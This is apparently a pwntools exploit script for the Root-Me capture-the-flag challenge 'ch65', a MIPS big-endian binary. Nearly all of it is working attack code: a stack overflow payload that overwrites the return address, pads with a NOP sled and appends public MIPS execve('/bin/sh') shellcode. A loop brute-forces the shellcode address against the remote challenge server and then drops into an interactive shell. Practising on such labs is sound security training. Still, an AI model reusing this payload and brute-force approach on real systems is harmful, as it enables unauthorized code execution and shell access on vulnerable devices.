from pwn import *
import time
import sys

def ch65(DEBUG):
	context.arch = 'mips'
	context.endian = 'big'
	if DEBUG=="1":
		shellcode_addr = 0x76fff6c0
		r = process("./ch65")
		raw_input("debug?")
	elif DEBUG=="2":
		shellcode_addr = 0x76fff6c0
		r = process(["qemu-mips-static","-g","12345", "./ch65"]) # run and debug
	elif DEBUG=="3":
		shellcode_addr = 0x76fff6c0
		r = process(["qemu-mips-static","./ch65"]) # Just run
	elif DEBUG=="4":
		shellcode_addr = 0x7ffffc58
		s = ssh(host='challenge03.root-me.org', user='app-systeme-ch65', password='app-systeme-ch65', port=2223)
		r = s.process('./ch65')
	elif DEBUG=="5":
		shellcode_addr = 0x7ffffd44
		s = ssh(host='challenge03.root-me.org', user='app-systeme-ch65', password='app-systeme-ch65', port=2223)
		r = s.process(["/usr/bin/qemu-mips","-g","1234","./ch65"])
	elif DEBUG=="6":
		shellcode_addr = 0x7ffffe20
		r = remote("challenge03.root-me.org", 56565)
	
	'''
	# payload = "AAAABBBBCCCCDDDDEEEEFFFF00001111"
	# r.send(payload)
	shellcode_addr = 0x76fff6a8+0x14+4
	shellcode = "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00" # http://shell-storm.org/shellcode/files/shellcode-782.php
	log.info("shellcode_addr: %#x" % shellcode_addr)
	payload = "A"*0x14
	payload += p32(shellcode_addr)
	payload += shellcode
	# raw_input("?")
	r.send(payload)
	r.interactive()
	
	'''
	def connect():
		r = remote("challenge03.root-me.org", 56565)
		return r
	shellcode_addr = 0x7ffffe20
	while 1:
		r = connect()
		log.info("shellcode_addr: %#x" % shellcode_addr)
		payload = "A"*0x14
		payload += p32(shellcode_addr)
		payload += p32(0)*12 # nop
		payload += "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00" # http://shell-storm.org/shellcode/files/shellcode-782.php
		r.send(payload)
		r.interactive()
		shellcode_addr += 4
	

ch65(sys.argv[1])	# python2 ch65.py 2


'''
gdb-miltiarch
source /opt/tools/pwndbg/gdbinit.py
set architecture mips
set endian big
target remote 127.0.0.1:1234
b*0x00400144
b*0x00400180
'''
